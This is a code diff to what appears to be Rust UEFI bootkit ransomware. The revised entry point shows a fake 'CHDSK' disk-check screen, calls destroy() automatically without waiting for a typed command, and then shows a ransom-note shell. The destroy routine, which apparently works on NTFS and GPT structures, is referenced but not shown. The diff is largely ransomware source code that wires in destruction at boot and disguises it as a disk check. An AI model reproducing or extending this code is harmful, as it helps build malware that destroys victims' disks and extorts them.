@@ -1,7 +1,6 @@
 #![no_main]
 #![no_std]
 #![feature(abi_efiapi)]
-#![feature(slice_as_chunks)]
 
 extern crate alloc;
 
@@ -22,7 +21,13 @@ mod gpt;
 mod file;
 mod ntfs;
 
-fn init_screen(st: &mut SystemTable<Boot>) {
+fn init_chdsk_screen(st: &mut SystemTable<Boot>) {
+    st.stdout().clear().unwrap_success();
+    st.stdout().enable_cursor(false).unwrap_success();
+    st.stdout().write_str(include_str!("chdsk_note.txt")).unwrap();
+}
+
+fn init_ransom_screen(st: &mut SystemTable<Boot>) {
     st.stdout().clear().unwrap_success();
     st.stdout().enable_cursor(true).unwrap_success();
     st.stdout().set_color(Color::Red, Color::Black).unwrap_success();
@@ -49,13 +54,8 @@ fn take_input(system_table: &mut SystemTable<Boot>, char_16: Char16, buffer: &mu
         '\r' => {
             if buffer == "clear" {
                 stdout.clear().unwrap_success();
-                init_screen(&mut st);
+                init_ransom_screen(&mut st);
                 buffer.clear();
-            } else if buffer == "test" {
-
-                //destroy2(system_table);
-            } else if buffer == "destroy" {
-                destroy(system_table);
             } else if buffer == "shutdown" {
                 system_table.runtime_services().reset(
                     ResetType::Shutdown,
@@ -90,14 +90,10 @@ fn wait_for_input(boot_services: &BootServices, events: &mut [Event; 1]) {
     boot_services.wait_for_event(events).unwrap().unwrap();
 }
 
-#[entry]
-fn main(_handle: Handle, mut st: SystemTable<Boot>) -> Status {
-    uefi_services::init(&mut st).unwrap_success();
-    st.boot_services().set_watchdog_timer(0, 65536, None).unwrap_success();
+fn shell_land(mut st: &mut SystemTable<Boot>) {
+    init_ransom_screen(&mut st);
 
-    init_screen(&mut st);
     let mut buffer: String = String::from("");
-
     let mut key_event = unsafe { [st.stdin().wait_for_key_event().unsafe_clone()] };
 
     loop {
@@ -106,6 +102,23 @@ fn main(_handle: Handle, mut st: SystemTable<Boot>) -> Status {
             take_input(&mut st, key, &mut buffer);
         }
     }
+}
 
-    //Status::SUCCESS
+#[entry]
+fn main(_handle: Handle, mut st: SystemTable<Boot>) -> Status {
+    uefi_services::init(&mut st).unwrap_success();
+
+    // Disable the 5 min timeout
+    st.boot_services().set_watchdog_timer(0, 65536, None).unwrap_success();
+
+    // Print CHDSK message
+    init_chdsk_screen(&mut st);
+
+    // Speak for it self
+    destroy(&st);
+
+    // Go to shell with ransom note
+    shell_land(&mut st);
+
+    Status::SUCCESS
 }
